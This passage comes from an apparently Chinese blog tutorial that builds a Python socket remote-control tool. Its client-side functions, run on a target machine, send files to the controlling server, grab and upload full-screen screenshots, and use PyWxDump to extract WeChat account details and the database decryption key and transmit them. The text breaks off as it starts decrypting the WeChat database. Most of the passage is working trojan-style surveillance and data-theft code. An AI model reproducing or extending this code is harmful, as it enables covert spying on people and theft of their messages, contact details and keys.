TB</p><p>a[æœåŠ¡ç«¯å‘é€ä¸‹è½½æ–‡ä»¶æŒ‡ä»¤å¹¶æŒ‡å®šæ–‡ä»¶åç§°]&ndash;>b[å®¢æˆ·ç«¯æ¥æ”¶ä¸‹è½½æ–‡ä»¶æŒ‡ä»¤]</p><p>b&ndash;>c[å®¢æˆ·ç«¯æœç´¢æ–‡ä»¶æ˜¯å¦å­˜åœ¨]</p><p>c&ndash;>|å­˜åœ¨|d[å®¢æˆ·ç«¯è¯»å–æ–‡ä»¶æ•°æ®å¹¶å‘é€å¤´éƒ¨ä¿¡æ¯]</p><p>c&ndash;>|ä¸å­˜åœ¨|e[å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€ä¸å­˜åœ¨æŒ‡ä»¤]</p><p>d&ndash;>f[æœåŠ¡ç«¯æ¥æ”¶å¤´éƒ¨ä¿¡æ¯å‘é€ç¡®è®¤ä¿¡æ¯]</p><p>e&ndash;>h[åŒæ–¹é€€å‡ºä¸‹è½½æ–‡ä»¶æµç¨‹]</p><p>f&ndash;>f1[å®¢æˆ·ç«¯æ¥æ”¶ç¡®è®¤ä¿¡æ¯å¹¶å‘é€æ–‡ä»¶æ•°æ®]</p><p>f1&ndash;>f2[æœåŠ¡ç«¯æ¥æ”¶æ–‡ä»¶æ•°æ®å¹¶å†™å…¥æœ¬åœ°æ–‡ä»¶]</p><p>{% endmermaid %}</p><p>è¿™å…¶ä¸­æœ‰ä¸€æ­¥æ˜¯å‘é€å’Œç¡®è®¤æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ï¼Œè¿™æ˜¯ä¸ºäº†å‘Šè¯‰æœåŠ¡ç«¯æ‰€è¦æ¥æ”¶çš„æ–‡ä»¶çš„æ–‡ä»¶å¤§å°å’Œåç§°ï¼Œä»¥ä¾¿å†™å…¥æ–‡ä»¶ã€‚</p><p>å½“ç„¶è¿™ä¸€æ­¥æ˜¯å¯ä»¥çœç•¥çš„ï¼ŒæœåŠ¡ç«¯å¯ä»¥æ ¹æ®è¾“å…¥çš„æŒ‡ä»¤ä¿¡æ¯å¾—çŸ¥æ–‡ä»¶çš„åç§°</p><p>åœ¨æ­¤ç¨‹åºä¸­ï¼Œä½¿ç”¨ <code>get æ–‡ä»¶åç§°</code> çš„æ–¹å¼å‘Šè¯‰åŒæ–¹ï¼Œæˆ‘éœ€è¦è¿›è¡Œä¸‹è½½æ–‡ä»¶çš„æµç¨‹</p><p><strong>Serverç«¯getå‡½æ•°ï¼š</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æ–‡ä»¶ä¸å­˜åœ¨çš„æƒ…å†µ  </span>
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;file_not_exist&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;æ–‡ä»¶ä¸å­˜åœ¨&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æ¥æ”¶æ–‡ä»¶å¤´éƒ¨å¤§å°  </span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_size</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=n>rev</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>error</span><span class=p>,</span> <span class=ne>ConnectionResetError</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;åœ¨æ¥æ”¶æ–‡ä»¶å¤´éƒ¨é•¿åº¦æ—¶å‘ç”Ÿé”™è¯¯&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=c1># å‘é€ç¡®è®¤æ¶ˆæ¯  </span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size_ok&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æ¥æ”¶æ–‡ä»¶å¤´éƒ¨ä¿¡æ¯  </span>
</span></span><span class=line><span class=cl>    <span class=n>header_bytes</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>header_size</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>header_bytes</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>header</span><span class=p>[</span><span class=s1>&#39;file_name&#39;</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=n>file_size</span> <span class=o>=</span> <span class=n>header</span><span class=p>[</span><span class=s1>&#39;file_size&#39;</span><span class=p>]</span>  
</span></span><span class=line><span class=cl>    <span class=c1># å‘é€ç¡®è®¤æ¶ˆæ¯  </span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;header_ok&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;æ–‡ä»¶åç§°ï¼š</span><span class=si>{</span><span class=n>file_name</span><span class=si>}</span><span class=s1>ï¼Œæ–‡ä»¶å¤§å°ï¼š</span><span class=si>{</span><span class=n>file_size</span><span class=si>}</span><span class=s1> B&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;å¼€å§‹æ¥æ”¶æ–‡ä»¶...&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_name</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=n>file_size</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=n>content</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                <span class=n>file_size</span> <span class=o>-=</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>IOError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;åœ¨å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;æ¥æ”¶æ–‡ä»¶å®Œæˆ&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Clientç«¯getå‡½æ•°ï¼š</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=n>file_name</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>isfile</span><span class=p>(</span><span class=n>file_name</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;file_exist&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>file_size</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>getsize</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header</span> <span class=o>=</span> <span class=p>{</span>  
</span></span><span class=line><span class=cl>            <span class=s1>&#39;file_name&#39;</span><span class=p>:</span> <span class=n>file_name</span><span class=p>,</span>  
</span></span><span class=line><span class=cl>            <span class=s1>&#39;file_size&#39;</span><span class=p>:</span> <span class=n>file_size</span>  
</span></span><span class=line><span class=cl>        <span class=p>}</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_json</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>header</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_bytes</span> <span class=o>=</span> <span class=n>header_json</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>header_size</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;i&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>header_bytes</span><span class=p>))</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>header_size</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;size_ok&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>return</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>header_bytes</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>rev</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;header_ok&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_name</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                    <span class=k>while</span> <span class=n>file_size</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                        <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                        <span class=n>file_size</span> <span class=o>-=</span> <span class=nb>len</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;å‘é€é”™è¯¯: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>                <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;file_not_exist&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214251.png alt=ä¸‹è½½æ–‡ä»¶></p><h3 id=è¿œç¨‹ä¸Šä¼ æ–‡ä»¶>è¿œç¨‹ä¸Šä¼ æ–‡ä»¶</h3><p>åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæ•´ä½“çš„æµç¨‹å’Œä¸Šé¢çš„è¿œç¨‹æ–‡ä»¶ä¸‹è½½åŸºæœ¬ä¸€è‡´ï¼Œå°±æ˜¯å°†ä¸Šæ–¹æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„æµç¨‹å¯¹è°ƒ</p><p>è¿™é‡Œå°±ä¸è¿‡å¤šä»‹ç»ï¼Œä»£ç æ˜¯ä¸€æ ·çš„</p><p>åœ¨æ­¤ç¨‹åºä¸­ä½¿ç”¨ <code>put æ–‡ä»¶åç§°</code> çš„å½¢å¼ï¼Œå‘Šè¯‰åŒæ–¹æˆ‘éœ€è¦è¿›å…¥ä¸Šä¼ æ–‡ä»¶çš„æµç¨‹</p><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214303.png alt=ä¸Šä¼ æ–‡ä»¶></p><h3 id=è¿œç¨‹è·å–å±å¹•æˆªå›¾>è¿œç¨‹è·å–å±å¹•æˆªå›¾</h3><p>Pythonè·å–å±å¹•æˆªå›¾çš„æ–¹å¼å¾ˆå¤šï¼Œæ¯”å¦‚PILä¸­çš„ImageGrabæ¨¡å—ã€windows APIã€PyQtã€pyautoguiç­‰ç­‰</p><p><a href=https://blog.csdn.net/c_lanxiaofang/article/details/126412158>å‚è€ƒæ–‡ç« </a></p><p>åœ¨æ­¤ç¨‹åºä¸­ä½¿ç”¨äº†PILä¸­çš„ImageGrabæ¨¡å—ï¼ŒåŸå› å°±æ˜¯æ“ä½œååˆ†ç®€å•ï¼Œç¼ºç‚¹æ˜¯æ•ˆç‡è¾ƒä½ï¼Œä½†æ˜¯å¯¹äºæˆ‘ä»¬è¿™ä¸ªç¨‹åºæ¥è¯´ï¼Œå‡ ä¹æ„Ÿè§‰ä¸å‡ºå·®åˆ«</p><p>ImageGrabæ¨¡å—åªéœ€è¦ä¸¤æ¡å‘½ä»¤å°±èƒ½æå®šå…¨å±æˆªå›¾ï¼Œååˆ†æ–¹ä¾¿</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>im</span> <span class=o>=</span> <span class=n>ImageGrab</span><span class=o>.</span><span class=n>grab</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>im</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>
</span></span></code></pre></div><p>è¿œç¨‹è·å–å±å¹•æˆªå›¾çš„æ•´ä½“æµç¨‹å’Œæ¡†æ¶ï¼š</p><p>{% mermaid %}</p><p>graph TB</p><p>a[æœåŠ¡ç«¯å‘é€æˆªå±æŒ‡ä»¤å¹¶è¿›å…¥æˆªå±æµç¨‹]&ndash;>b[å®¢æˆ·ç«¯æ¥æ”¶æˆªå±æŒ‡ä»¤å¹¶è¿›å…¥æˆªå±æµç¨‹]</p><p>b&ndash;>c[æœåŠ¡ç«¯å‘é€&rsquo;start&rsquo;æŒ‡ä»¤]</p><p>c&ndash;>d[å®¢æˆ·ç«¯ç«¯æ¥æ”¶&rsquo;start&rsquo;æŒ‡ä»¤å¹¶æˆªå±ä¿å­˜æ–‡ä»¶]</p><p>d&ndash;>f[è¿›å…¥getä¸‹è½½æ–‡ä»¶æµç¨‹]</p><p>c&ndash;>f</p><p>f&ndash;>e[å®¢æˆ·ç«¯åˆ é™¤æˆªå±æ–‡ä»¶,åŒæ–¹é€€å‡ºæˆªå±æµç¨‹]</p><p>{% endmermaid %}</p><p>åœ¨æ­¤ç¨‹åºä¸­ï¼Œä½¿ç”¨ <code>screen</code> çš„æ–¹å¼å‘Šè¯‰åŒæ–¹ï¼Œæˆ‘éœ€è¦è¿›è¡Œæˆªå±çš„æµç¨‹</p><p><strong>Serverç«¯screenå‡½æ•°ï¼š</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>screen_shot</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;screen&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;æˆªå›¾å¤±è´¥&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>)</span>
</span></span></code></pre></div><p><strong>Clientç«¯screenå‡½æ•°ï¼š</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>screen_shot</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>  
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;screen&#39;</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>rev</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>rev</span> <span class=o>!=</span> <span class=sa>b</span><span class=s1>&#39;start&#39;</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=k>return</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æˆªå›¾å¹¶å‘ç”Ÿåˆ°æœåŠ¡ç«¯  </span>
</span></span><span class=line><span class=cl>    <span class=n>im</span> <span class=o>=</span> <span class=n>ImageGrab</span><span class=o>.</span><span class=n>grab</span><span class=p>()</span>  
</span></span><span class=line><span class=cl>    <span class=c1># æˆªå±å‘½åä¸ºå½“å‰æ—¶é—´  </span>
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>strftime</span><span class=p>(</span><span class=s2>&#34;%Y-%m-</span><span class=si>%d</span><span class=s2> %H-%M-%S&#34;</span><span class=p>,</span> <span class=n>time</span><span class=o>.</span><span class=n>localtime</span><span class=p>())</span> <span class=o>+</span> <span class=s1>&#39;.png&#39;</span>  
</span></span><span class=line><span class=cl>    <span class=n>im</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=n>get_file</span><span class=p>(</span><span class=n>conn</span><span class=p>,</span> <span class=n>file_name</span><span class=p>)</span>  
</span></span><span class=line><span class=cl>    <span class=c1># åˆ é™¤æœ¬åœ°æˆªå›¾  </span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>file_name</span><span class=p>)</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214314.png alt=æˆªå±>
<img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214330.png alt=æˆªå–çš„å›¾ç‰‡æ‹‰å–åˆ°æœ¬åœ°></p><h3 id=è·å–å¾®ä¿¡æ•°æ®>è·å–å¾®ä¿¡æ•°æ®</h3><p>è¿™é‡ŒåŠŸèƒ½æ˜¯åŸºäºGithubå¼€æºé¡¹ç›®ï¼š<a href=https://github.com/xaoyaoo/PyWxDump>PyWxDump</a></p><p>å…¶æä¾›äº†ä¸€ç³»åˆ—è·å–å¾®ä¿¡æ•°æ®ä¿¡æ¯ã€èŠå¤©è®°å½•ç­‰Pythonæ¥å£</p><p>åˆ©ç”¨è¿™ä¸ªpythoné¡¹ç›®ï¼Œå¯ä»¥å¾ˆå®¹æ˜“è·å–åˆ°å¾®ä¿¡æ•°æ®</p><p>å¦‚è·å–å¾®ä¿¡åŸºæœ¬ä¿¡æ¯ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_wechat_info</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># è¯»å–æ–‡ä»¶ä¸­çš„jsonæ•°æ®</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;version_list.json&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>version_list</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># è¯»å–å¾®ä¿¡ä¿¡æ¯</span>
</span></span><span class=line><span class=cl>    <span class=n>wx_info</span> <span class=o>=</span> <span class=n>read_info</span><span class=p>(</span><span class=n>version_list</span><span class=p>,</span> <span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>str</span><span class=p>(</span><span class=n>wx_info</span><span class=p>)</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;[-]&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>wx_info</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span><span class=p>,</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>pid</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;pid&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>version</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;version&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>account</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;account&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>mobile</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;mobile&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>mail</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;mail&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>wxid</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;wxid&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;filePath&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>wx_info</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=s1>&#39;key&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>wechat_files</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>Path</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span><span class=o>.</span><span class=n>parent</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    ================== wechat info ==================
</span></span></span><span class=line><span class=cl><span class=s2>    [+] è¿›ç¨‹å·: </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] ç‰ˆæœ¬: </span><span class=si>{</span><span class=n>version</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] å¾®ä¿¡å·: </span><span class=si>{</span><span class=n>account</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] æ‰‹æœºå·: </span><span class=si>{</span><span class=n>mobile</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] å¾®ä¿¡å: </span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] é‚®ç®±: </span><span class=si>{</span><span class=n>mail</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] å¾®ä¿¡æ•°æ®è·¯å¾„: </span><span class=si>{</span><span class=n>file_path</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] wxid: </span><span class=si>{</span><span class=n>wxid</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    [+] key: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    ================== wechat info ==================
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>content</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;UTF-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>file_path</span><span class=p>,</span> <span class=n>key</span>
</span></span></code></pre></div><p><img src=https://cdn.jsdelivr.net/gh/Pi3-l22/pico_rep/img/20231220214347.png alt=è·å–å¾®ä¿¡åŸºæœ¬ä¿¡æ¯></p><p>è·å–å¹¶è§£å¯†å¾®ä¿¡æ•°æ®åº“ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_wechat</span><span class=p>(</span><span class=n>conn</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span><span class=p>,</span> <span class=n>key</span> <span class=o>=</span> <span class=n>get_wechat_info</span><span class=p>(</span><span class=n>conn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file_path</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
